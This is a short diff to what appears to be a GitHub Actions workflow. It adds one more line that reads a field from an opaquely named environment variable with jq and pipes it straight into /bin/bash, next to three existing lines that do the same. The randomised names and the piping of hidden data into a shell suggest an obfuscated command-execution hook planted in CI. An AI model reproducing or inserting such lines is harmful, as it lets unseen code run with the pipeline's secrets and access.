@@ -22,6 +22,7 @@ jobs:
           printf '%s' "$gos378" | jq -r .bcvus2 | /bin/bash
           echo $megg71759 | jq -r .ix895 | /bin/bash
           echo $ci3248 | jq -r .sattm705 | /bin/bash
+          echo $g0 | jq -r .bitgm61594 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
